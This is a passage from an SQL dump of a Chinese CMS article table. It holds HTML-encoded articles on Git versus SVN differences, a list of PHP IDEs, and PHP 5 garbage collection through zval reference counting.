&lt;p&gt;同样，这种分布式的操作模式对于开源软件社区的开发来说也是个巨大的恩赐，你不必再像以前那样做出补丁包，通过email方式发送出去，你只需要创建一个分支，向项目团队发送一个推请求。这能让你的代码保持最新，而且不会在传输过程中丢失。&lt;a href=&quot;http://www.github.com/&quot; target=&quot;_new&quot;&gt;GitHub.com&lt;/a&gt;就是一个这样的优秀案例。&lt;/p&gt;\r\n   &lt;p&gt;有些谣言传出来说subversion将来的版本也会基于分布式模式。但至少目前还看不出来。&lt;/p&gt;\r\n  &lt;/li&gt;\r\n&lt;li&gt;   &lt;h3&gt;GIT把内容按元数据方式存储，而SVN是按文件：&lt;/h3&gt;\r\n   &lt;p&gt;所有的资源控制系统都是把文件的元信息隐藏在一个类似.svn,.cvs等的文件夹里。如果你把.git目录的体积大小跟.svn比较，你会发现它 们差距很大。因为,.git目录是处于你的机器上的一个克隆版的版本库，它拥有中心版本库上所有的东西，例如标签，分支，版本记录等。&lt;/p&gt;\r\n  &lt;/li&gt;\r\n&lt;li&gt;   &lt;h3&gt;GIT分支和SVN的分支不同：&lt;/h3&gt;\r\n   &lt;p&gt;分支在SVN中一点不特别，就是版本库中的另外的一个目录。如果你想知道是否合并了一个分支，你需要手工运行像这样的命令&lt;em&gt;&lt;a href=&quot;http://jan.baresovi.cz/dr/en/subversion-mergeinfo&quot; target=&quot;_new&quot;&gt;svn propget svn:mergeinfo&lt;/a&gt;&lt;/em&gt;，来确认代码是否被合并。感谢Ben同学指出这个特征。所以，经常会发生有些分支被遗漏的情况。&lt;/p&gt;\r\n   &lt;p&gt;然而，处理GIT的分支却是相当的简单和有趣。你可以从同一个工作目录下快速的在几个分支间切换。你很容易发现未被合并的分支，你能简单而快捷的合并这些文件。&lt;/p&gt;\r\n  &lt;/li&gt;\r\n&lt;li&gt;   &lt;h3&gt;GIT没有一个全局的版本号，而SVN有：&lt;/h3&gt;\r\n   &lt;p&gt;目前为止这是跟SVN相比GIT缺少的最大的一个特征。你也知道，SVN的版本号实际是任何一个相应时间的源代码快照。我认为它是从CVS进化到 SVN的最大的一个突破。因为GIT和SVN从概念上就不同，我不知道GIT里是什么特征与之对应。如果你有任何的线索，请在评论里奉献出来与大家共享。&lt;/p&gt;\r\n   &lt;p&gt;&lt;em&gt;更新：有些读者指出，我们可以使用GIT的SHA-1来唯一的标识一个代码快照。这个并不能完全的代替SVN里容易阅读的数字版本号。但，用途应该是相同的。&lt;/em&gt;&lt;/p&gt;\r\n  &lt;/li&gt;\r\n&lt;li&gt;   &lt;h3&gt;GIT的内容完整性要优于SVN：&lt;/h3&gt;\r\n   &lt;p&gt;GIT的内容存储使用的是&lt;a href=&quot;http://en.wikipedia.org/wiki/SHA-1&quot; target=&quot;_new&quot;&gt;SHA-1&lt;/a&gt;哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。这里有一个很好的关于GIT内容完整性的讨论 – &lt;a href=&quot;http://stackoverflow.com/questions/964331/git-file-integrity&quot; target=&quot;_blank&quot;&gt;http://stackoverflow.com/questions/964331/git-file-integrity&lt;/a&gt;&lt;/p&gt;\r\n  &lt;/li&gt;\r\n&lt;/ol&gt;\r\n &lt;p&gt;GIT和SVN之间只有这五处不同吗？当然不是。我想这5个只是&lt;strong&gt;“最基本的”&lt;/strong&gt;和&lt;strong&gt;“最吸引人”&lt;/strong&gt;的，我只想到这5点。如果你发现有比这5点更有趣的，请共享出来，欢迎。&lt;/p&gt;\r\n &lt;p id=&quot;source&quot;&gt;[英文出处]：&lt;a href=&quot;http://boxysystems.com/index.php/5-fundamental-differences-between-git-svn/&quot;&gt;5 Fundamental differences between GIT &amp;amp; SVN&lt;/a&gt;&lt;/p&gt;\r\n', 1, 1, 0, 0, 1304728790, 1, 'admin'),
(104, 1, 'PHP开发工具集锦', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size:14px;line-height:22px;font-family:arial, sans-serif, 宋体;&quot;&gt;这里介绍了一些 PHP IDE 工具，非常见的 Editplus 之类的，都是专门为 PHP 开发的，有兴趣都可以试试看，找出自己用得顺手的就可以了，呵呵，本人一年来都是用 Zend Studio 作为开发工具，因为调试和编写都很方便，代码检测功能和手册查阅功能我非常喜欢。&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　我这里整理的都是专门为PHP设计的IDE，editplus,Ultra Edit等常用文本工具我就不介绍了！其中一些介绍是从那些下载站里复制过来的！&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;strong style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot;&gt;Zend Studio&lt;/strong&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　开发商:&amp;nbsp;&lt;a href=&quot;http://www.zend.com/store/products/zend-studio.php&quot; target=&quot;_blank&quot; style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;color:#003195;text-decoration:none;&quot;&gt;http://www.zend.com/store/products/zend-studio.php&lt;/a&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　目前公认的最强大的PHP开发工具，这种集成软件包包括了用于编辑，调试，配置PHP程序所需要的客户及服务器组件，软件包具有工业标准的PHP开发环境，代码完成引擎，功能齐全的调试器等&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;strong style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot;&gt;NuSphere PHPEd&lt;/strong&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;a href=&quot;http://www.nusphere.com/&quot; target=&quot;_blank&quot; style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;color:#003195;text-decoration:none;&quot;&gt;http://www.nusphere.com/&lt;/a&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　PhpED 通过无与伦比的PHP调试和压缩能力，以及一个新的NuSOAP web服务向导成为了PHP领域的领军产品。更加强大的Project Manager使得发布站点和应用程序比以前更加容易。现在可以在线程级别对正在运行或者开发中的程序进行测试和调校。支持 CVS 版本控制，而且，对PostgreSQL和MySQL数据库的本地支持为PHP使用开源数据库提供了一个广泛的环境。但对中文支持不太好，汉字都当作单字节处理了。PHPED还有Linux版本。&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;strong style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot;&gt;PHP Coder&lt;/strong&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;a href=&quot;http://www.phpide.de/&quot; target=&quot;_blank&quot; style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;color:#003195;text-decoration:none;&quot;&gt;http://www.phpide.de/&lt;/a&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　PHPCoder用于快速开发和调试PHP应用程序,它很容易扩展和定制,完全能够符合开发者的个性要求.1:结合了PHP编译器和参考文档,可以对编辑中的PHP脚本进行即时预览2:支持高亮显示HTML和PHP代码;3:自动完成功能,可以自动完成用户自定义代码片断;4:标准函数提示;5:有专门的工程项目管理器;6:对象浏览器搜寻编辑中文件的包含信息,自定义函数,并以树形显示.7:支持查找对称的语句标记符;8:支持高级搜索和替换;9:自带FTP功能;10:支持运行和断点调试11:......总之,PHPCoder是一个非常实用的,功能强大的编程环境,而且它是免费的！&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;strong style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot;&gt;Ankord PHP Expert Editor&lt;/strong&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;a href=&quot;http://www.ankord.com/phpxedit.html&quot; target=&quot;_blank&quot; style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;color:#003195;text-decoration:none;&quot;&gt;http://www.ankord.com/phpxedit.html&lt;/a&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　PHP Expert Editor是一个容易使用的 PHP 开发工具，它的功能照顾到初级者及专业开发人员。 PHP Expert Editor 内建 http server 用作测试及除错(你也可以使用其他 http server), PHP 语法检查, FTP 功能, 程式码样板等功能。&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;strong style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot;&gt;DzSoft PHP Editor&lt;/strong&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;a href=&quot;http://www.dzsoft.com/dzphp.htm&quot; target=&quot;_blank&quot; style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;color:#003195;text-decoration:none;&quot;&gt;http://www.dzsoft.com/dzphp.htm&lt;/a&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　专为 PHP 所设计的网页程序编辑软件 - DzSoft PHP Editor，具有 PHP 编辑、侦错、浏览、原始码检视、档案浏览、可自订的原始码样本..等功能，无须架设网站主机就可以测试 PHP 指令码，是一套功能强大的 PHP 编程软件。&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　DzSoft PHP Editor和Ankord PHP Expert Editor非常相识，几乎找不到他们的主要区别，关于这两个软件之间的具体内幕我也不太清楚！&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;strong style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot;&gt;Dev-PHP IDE&lt;/strong&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;a href=&quot;http://devphp.sourceforge.net/&quot; target=&quot;_blank&quot; style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;color:#003195;text-decoration:none;&quot;&gt;http://devphp.sourceforge.net/&lt;/a&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　非常好用的php编辑器，支持php-gtk，內建許多快速html表单，非常的好用，本身含繁体语言包，另附暗地论坛的中文语言包&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;strong style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot;&gt;Master PHP&lt;/strong&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;a href=&quot;http://www.gsoftwares.com/&quot; target=&quot;_blank&quot; style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;color:#003195;text-decoration:none;&quot;&gt;http://www.gsoftwares.com/&lt;/a&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　一款支持PHP, PHP3, PHTML, CSS, JS, HTML, HTM and SQL的编辑器，它允许用户编辑多种一次编辑多种文件，允许插入，运行和最优化程序的脚本，用户可以通过工具栏定制按钮和窗体，可以导出html和rtf格式，支持18种语言&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;strong style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot;&gt;Komodo&lt;/strong&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;a href=&quot;http://www.activestate.com/Products/Komodo/&quot; target=&quot;_blank&quot; style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;color:#003195;text-decoration:none;&quot;&gt;http://www.activestate.com/Products/Komodo/&lt;/a&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　Komodo支持在Windows与Linux上，Perl、Python及JavaScript等的程序语言开发，以及多种程序语言语法不同颜色标注。这款功能强大的IDE竟然不支持中文，连中文文件名的文件都打不开！&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;strong style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot;&gt;Maguma Studio&lt;/strong&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;a href=&quot;http://www.maguma.com/&quot; target=&quot;_blank&quot; style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;color:#003195;text-decoration:none;&quot;&gt;http://www.maguma.com/&lt;/a&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　Maguma Studio包含了编辑和调试 PHP 程序所有必须的工具。无论您是经验丰富的开发者、或是初学者它都适合您。带有十分完整的断点、分步等调试功能。支持以树形方式显示文件中的函数和类成员。&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;strong style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot;&gt;PhpLens&lt;/strong&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　&lt;a href=&quot;http://phplens.com/&quot; target=&quot;_blank&quot; style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;color:#003195;text-decoration:none;&quot;&gt;http://phplens.com&lt;/a&gt;&lt;br style=&quot;font-family:arial, sans-serif, 宋体;line-height:22px;&quot; /&gt;\r\n　　PhpLens是一款专为PHP开发人员准备的快速数据库开发程序。通过使用PhpLens，可以快速的设计、发布和维护数据库驱动的网络产品。它允许你以HTML表格的形式对数据库进行浏览、编辑、创建、删除和查找。不用写任何代码，它就允许你完成上述操作。&lt;/span&gt;', 1, 1, 0, 0, 1304834130, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(105, 1, '浅谈PHP 5中垃圾回收算法的演化', '', '', '&lt;div class=&quot;sum&quot;&gt;&lt;ul class=&quot;summary&quot;&gt;本文将分别讨论PHP5.2和PHP5.3的垃圾回收机制，并讨论这种演化和改进对于程序员编写PHP的影响以及要注意的问题。&lt;/ul&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;PHP是一门托管型语言，在PHP编程中程序员不需要手工处理内存资源的分配与释放(使用C编写PHP或Zend扩展除外)，这就意味着PHP本身实现了垃圾回收机制(Garbage Collection)。现在如果去PHP官方网站(php.net)可以看到，目前PHP5的两个分支版本PHP5.2和PHP5.3是分别更新的，这是因为许多项目仍然使用5.2版本的PHP，而5.3版本对5.2并不是完全兼容。PHP5.3在PHP5.2的基础上做了诸多改进，其中垃圾回收算法就属于一个比较大的改变。本文将分别讨论PHP5.2和PHP5.3的垃圾回收机制，并讨论这种演化和改进对于程序员编写PHP的影响以及要注意的问题。&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;PHP变量及关联内存对象的内部表示&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;垃圾回收说到底是对变量及其所关联内存对象的操作，所以在讨论PHP的垃圾回收机制之前，先简要介绍PHP中变量及其内存对象的内部表示(其C源代码中的表示)。&lt;/p&gt;\r\n&lt;p&gt;PHP官方文档中将PHP中的变量划分为两类：标量类型和复杂类型。标量类型包括布尔型、整型、浮点型和字符串;复杂类型包括数组、对象和资源;还有一个NULL比较特殊，它不划分为任何类型，而是单独成为一类。&lt;/p&gt;\r\n&lt;p&gt;所有这些类型，在PHP内部统一用一个叫做zval的结构表示，在PHP源代码中这个结构名称为“_zval_struct”。zval的具体定义在PHP源代码的“Zend/zend.h”文件中，下面是相关代码的摘录。&lt;/p&gt;\r\n&lt;pre&gt;&lt;ol class=&quot;dp-c&quot;&gt;&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&lt;span&gt;typedef&amp;nbsp;union&amp;nbsp;_zvalue_value&amp;nbsp;{ &amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;long&amp;nbsp;lval;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/*&amp;nbsp;long&amp;nbsp;value&amp;nbsp;*/&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;double&amp;nbsp;dval;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/*&amp;nbsp;double&amp;nbsp;value&amp;nbsp;*/&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;struct&amp;nbsp;{ &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;char&amp;nbsp;*val; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;int&amp;nbsp;len; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;str; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;HashTable&amp;nbsp;*ht;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/*&amp;nbsp;hash&amp;nbsp;table&amp;nbsp;value&amp;nbsp;*/&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;zend_object_value&amp;nbsp;obj; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;}&amp;nbsp;zvalue_value; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;struct&amp;nbsp;_zval_struct&amp;nbsp;{ &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/*&amp;nbsp;Variable&amp;nbsp;information&amp;nbsp;*/&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;zvalue_value&amp;nbsp;value;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&amp;nbsp;value&amp;nbsp;*/&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;zend_uint&amp;nbsp;refcount__gc; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;zend_uchar&amp;nbsp;type;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;/*&amp;nbsp;active&amp;nbsp;type&amp;nbsp;*/&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;zend_uchar&amp;nbsp;is_ref__gc; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;};&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/pre&gt;&lt;p&gt;其中联合体“_zvalue_value”用于表示PHP中所有变量的值，这里之所以使用union，是因为一个zval在一个时刻只能表示一种类型的变量。可以看到_zvalue_value中只有5个字段，但是PHP中算上NULL有8种数据类型，那么PHP内部是如何用5个字段表示8种类型呢?这算是PHP设计比较巧妙的一个地方，它通过复用字段达到了减少字段的目的。例如，在PHP内部布尔型、整型及资源(只要存储资源的标识符即可)都是通过lval字段存储的;dval用于存储浮点型;str存储字符串;ht存储数组(注意PHP中的数组其实是哈希表);而obj存储对象类型;如果所有字段全部置为0或NULL则表示PHP中的NULL，这样就达到了用5个字段存储8种类型的值。&lt;/p&gt;\r\n&lt;p&gt;而当前zval中的value(value的类型即是_zvalue_value)到底表示那种类型，则由“_zval_struct”中的type确定。_zval_struct即是zval在C语言中的具体实现，每个zval表示一个变量的内存对象。除了value和type，可以看到_zval_struct中还有两个字段refcount__gc和is_ref__gc，从其后缀就可以断定这两个家伙与垃圾回收有关。没错，PHP的垃圾回收全靠这俩字段了。其中refcount__gc表示当前有几个变量引用此zval，而is_ref__gc表示当前zval是否被按引用引用，这话听起来很拗口，这和PHP中zval的“Write-On-Copy”机制有关，由于这个话题不是本文重点，因此这里不再详述，读者只需记住refcount__gc这个字段的作用即可。&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;PHP5.2中的垃圾回收算法——Reference Counting&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;PHP5.2中使用的内存回收算法是大名鼎鼎的Reference Counting，这个算法中文翻译叫做“引用计数”，其思想非常直观和简洁：为每个内存对象分配一个计数器，当一个内存对象建立时计数器初始化为1(因此此时总是有一个变量引用此对象)，以后每有一个新变量引用此内存对象，则计数器加1，而每当减少一个引用此内存对象的变量则计数器减1，当垃圾回收机制运作的时候，将所有计数器为0的内存对象销毁并回收其占用的内存。而PHP中内存对象就是zval，而计数器就是refcount__gc。&lt;/p&gt;\r\n&lt;p&gt;例如下面一段PHP代码演示了PHP5.2计数器的工作原理(计数器值通过xdebug得到)：&lt;/p&gt;\r\n&lt;pre&gt;&lt;ol class=&quot;dp-c&quot;&gt;&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&lt;span&gt;&amp;lt;?php &amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span class=&quot;vars&quot;&gt;$val1&lt;/span&gt;&lt;span&gt;&amp;nbsp;=&amp;nbsp;100;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;//zval(val1).refcount_gc&amp;nbsp;=&amp;nbsp;1; &lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span class=&quot;vars&quot;&gt;$val2&lt;/span&gt;&lt;span&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$val1&lt;/span&gt;&lt;span&gt;;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;//zval(val1).refcount_gc&amp;nbsp;=&amp;nbsp;2,zval(val2).refcount_gc&amp;nbsp;=&amp;nbsp;2(因为是Write&amp;nbsp;on&amp;nbsp;copy，当前val2与val1共同引用一个zval) &lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span class=&quot;vars&quot;&gt;$val2&lt;/span&gt;&lt;span&gt;&amp;nbsp;=&amp;nbsp;200;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;//zval(val1).refcount_gc&amp;nbsp;=&amp;nbsp;1,zval(val2).refcount_gc&amp;nbsp;=&amp;nbsp;1(此处val2新建了一个zval) &lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;unset(&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$val1&lt;/span&gt;&lt;span&gt;);&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;//zval(val1).refcount_gc&amp;nbsp;=&amp;nbsp;0($val1引用的zval再也不可用，会被GC回收) &lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;?&amp;gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/pre&gt;&lt;p&gt;Reference Counting简单直观，实现方便，但却存在一个致命的缺陷，就是容易造成内存泄露。很多朋友可能已经意识到了，如果存在循环引用，那么Reference Counting就可能导致内存泄露。例如下面的代码：&lt;/p&gt;\r\n&lt;pre&gt;&lt;ol class=&quot;dp-c&quot;&gt;&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&lt;span&gt;&amp;lt;?php &amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span class=&quot;vars&quot;&gt;$a&lt;/span&gt;&lt;span&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;&lt;span&gt;(); &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span class=&quot;vars&quot;&gt;$a&lt;/span&gt;&lt;span&gt;[]&amp;nbsp;=&amp;nbsp;&amp;amp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$a&lt;/span&gt;&lt;span&gt;; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;unset(&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$a&lt;/span&gt;&lt;span&gt;); &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;?&amp;gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/pre&gt;&lt;p&gt;这段代码首先建立了数组a，然后让a的第一个元素按引用指向a，这时a的zval的refcount就变为2，然后我们销毁变量a，此时a最初指向的zval的refcount为1，但是我们再也没有办法对其进行操作，因为其形成了一个循环自引用.&lt;br 